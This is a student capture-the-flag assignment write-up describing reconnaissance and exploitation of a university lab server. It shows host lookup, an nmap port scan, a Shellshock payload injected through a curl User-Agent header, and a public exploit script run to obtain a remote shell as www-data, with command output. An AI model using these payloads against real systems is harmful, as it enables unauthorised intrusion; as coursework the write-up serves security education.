---
title: Assignment 6
author:
  - Hendrik Werner s4549775
  - Aniek Den Teuling s1010747
date: \today
fontsize: 12pt
geometry: margin=5em
header-includes:
  - \usepackage{listings}
---

# Capture the Flag

To establish the servers IP address from the hostname we used `getent`:

```
$ getent hosts ossec-host.cs.ru.nl
131.174.142.7   ossec-host.cs.ru.nl
```

The first thing we tried, was connecting to the server via telnet, but the connection was refused:

```bash
$ telnet ossec-host.cs.ru.nl
Trying 131.174.142.7...
telnet: Unable to connect to remote host: Connection refused
```

Next we tried connecting via SSH, and there is indeed an SSH server running on the host, but connecting requires a password that we do not know:

```
$ ssh root@ossec-host.cs.ru.nl
root@ossec-host.cs.ru.nl's password:
Permission denied, please try again.
```

We can use `nmap` to scan for open ports on the host server:

```
nmap 131.174.142.7

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-10 19:00 CET
Nmap scan report for ossec-host.cs.ru.nl (131.174.142.7)
Host is up (0.073s latency).
Not shown: 937 filtered ports, 61 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 84.46 seconds
```

The only two open ports are port 22 for ssh, and port 80 for http.

We tried to exploit the Shellshock vulnerability over HTTP, but for some reason it did not work. We asked the student assistants about this, but they could not identify the problem either. The command we used was

\begin{lstlisting}[breaklines=true]
curl -H "User-Agent: () { :;}; /bin/ls" 'http://ossec-host.cs.ru.nl/cgi-bin/fortunecow.sh'`
\end{lstlisting}

The student assistants recommended downloading a ready made exploit script, so we found one on <https://exploit.db.com/exploits/34900/>, and successfully used it to get a shell on the remote host.

\begin{lstlisting}[breaklines=true]
$ python2 34900.py rhost=ossec-host.cs.ru.nl rport=12345 payload=bind pages=/cgi-bin/fortunecow.sh
[-] Trying exploit on : /cgi-bin/fortunecow.sh
[!] Successfully exploited
[!] Connected to ossec-host.cs.ru.nl
ossec-host.cs.ru.nl> uname -a
Linux ossec-host 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
ossec-host.cs.ru.nl> whoami
www-data
ossec-host.cs.ru.nl> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}

As you can see the server uses Ubuntu with Linux kernel version 3.13.0, and we do not have root privileges, and are logged in as user `www-data`.
